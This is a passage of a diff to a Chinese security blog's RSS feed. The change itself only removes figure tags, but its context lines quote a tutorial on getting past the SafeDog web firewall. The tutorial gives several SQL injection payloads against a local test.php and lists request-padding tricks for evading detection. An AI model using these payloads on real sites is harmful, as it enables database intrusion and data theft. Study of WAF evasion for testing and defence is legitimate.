-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png">
         
-    </a></figure></p>
+    </a></p>
 <p>但是用union和select放在在一起就被发现啦
-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png">
         
-    </a></figure></p>
+    </a></p>
 <p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1182,9 +1182,9 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png">
+</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png">
         
-    </a></figure></p>
+    </a></p>
 <ul>
 <li>对于数字型注入,可以将其转换成浮点型</li>
 <li>联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,</li>
@@ -1199,9 +1199,9 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png">
+</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png">
         
-    </a></figure></p>
+    </a></p>
 <p>基于报错信息的注入绕安全狗</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1223,9 +1223,9 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png">
+</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png">
         
-    </a></figure></p>
+    </a></p>
 <p>使用反引号去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1285,8 +1285,8 @@ php+mysql环境下支持的空格有：</p>
 GET类型请求转换成POST类型
 Content-Length头长度大于4008
 正常参数放置在脏数据后面</p>
-<p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png">
+<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png">
         
-    </a></figure></p>]]></description>
+    </a></p>]]></description>
 </item></channel>
 </rss>
